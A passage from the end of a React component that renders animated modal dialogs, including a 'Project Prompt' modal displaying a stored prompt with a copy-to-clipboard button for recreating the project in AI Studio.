                  className="px-6 py-2 bg-white text-black text-[10px] font-bold uppercase tracking-widest rounded-lg hover:bg-zinc-200 transition-colors"
                >
                  Close
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Project Prompt Modal */}
      <AnimatePresence>
        {showPrompt && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-zinc-900 border border-zinc-800 rounded-2xl w-full max-w-2xl flex flex-col shadow-2xl overflow-hidden"
            >
              <div className="px-6 py-4 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/50">
                <div className="flex items-center gap-3">
                  <Sparkles className="w-5 h-5 text-purple-400" />
                  <h2 className="text-sm font-bold uppercase tracking-[0.2em]">Project Prompt</h2>
                </div>
                <button onClick={() => setShowPrompt(false)} className="p-2 hover:bg-zinc-800 rounded-full text-zinc-500 hover:text-white transition-colors">
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="p-6 space-y-4">
                <p className="text-xs text-zinc-400 leading-relaxed">
                  Use this prompt in AI Studio to recreate this exact project in another account.
                </p>
                <div className="relative group">
                  <div className="absolute top-3 right-3 opacity-0 group-hover:opacity-100 transition-opacity">
                    <button
                      onClick={copyToClipboard}
                      className="p-2 bg-zinc-800 hover:bg-zinc-700 rounded-lg border border-zinc-700 text-zinc-300 transition-all flex items-center gap-2"
                    >
                      {copied ? <Check className="w-3 h-3 text-emerald-500" /> : <Copy className="w-3 h-3" />}
                      <span className="text-[10px] uppercase font-bold">{copied ? "Copied" : "Copy"}</span>
                    </button>
                  </div>
                  <div className="bg-black/50 border border-zinc-800 rounded-xl p-5 font-mono text-[11px] text-zinc-300 leading-relaxed whitespace-pre-wrap max-h-[40vh] overflow-y-auto">
                    {PROJECT_PROMPT}
                  </div>
                </div>
              </div>
              
              <div className="px-6 py-4 bg-zinc-950 border-t border-zinc-800 flex justify-end">
                <button
                  onClick={() => setShowPrompt(false)}
                  className="px-6 py-2 bg-white text-black text-[10px] font-bold uppercase tracking-widest rounded-lg hover:bg-zinc-200 transition-colors"
                >
                  Close
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

